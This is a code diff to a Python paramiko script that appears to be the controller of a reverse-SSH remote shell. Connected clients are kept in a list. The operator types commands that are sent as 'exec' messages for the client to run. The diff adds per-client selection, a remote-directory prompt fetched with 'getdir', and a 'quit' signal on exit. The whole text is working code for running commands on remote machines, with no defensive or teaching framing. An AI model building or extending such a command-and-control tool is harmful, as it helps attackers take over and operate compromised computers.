@@ -26,11 +26,18 @@ class ClientServer(paramiko.ServerInterface):
             return paramiko.OPEN_SUCCEEDED
         return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
 
+def get_client_path(client_no):
+    _, _, client_ssh_channel = connected_clients[client_no]
+    if not client_ssh_channel.closed:
+        client_ssh_channel.send("getdir")
+        return client_ssh_channel.recv(1024).decode('utf-8').strip()
+    return ''
+
 #ssh client handler
-def client_handler():
-    _, client_ssh_session, client_ssh_channel = connected_clients[0]
+def client_handler(client_no):
+    _, client_ssh_session, client_ssh_channel = connected_clients[client_no]
     while not client_ssh_channel.closed:
-        command = input("<Shell:#> ").rstrip()
+        command = input(f"{get_client_path(client_no)}:#> ").rstrip()
         if len(command):
             if command != "exit":
                 client_ssh_channel.send("exec " + command)
@@ -38,6 +45,7 @@ def client_handler():
             else:
                 print("[*] Exiting")
                 try:
+                    client_ssh_channel.send("quit")
                     client_ssh_session.close()
                 except:
                     print("[!] Error closing SSH session")
@@ -87,7 +95,7 @@ while True:
         else:
             print(f"[*] SSH Client Authenticated with username: {client_server.username}")
             connected_clients.append((client_server.username, client_ssh_session, client_ssh_channel))
-            client_handler()
+            client_handler(0)
     except KeyboardInterrupt:
         print("[*] Exiting Script")
         exit_client_sessions()
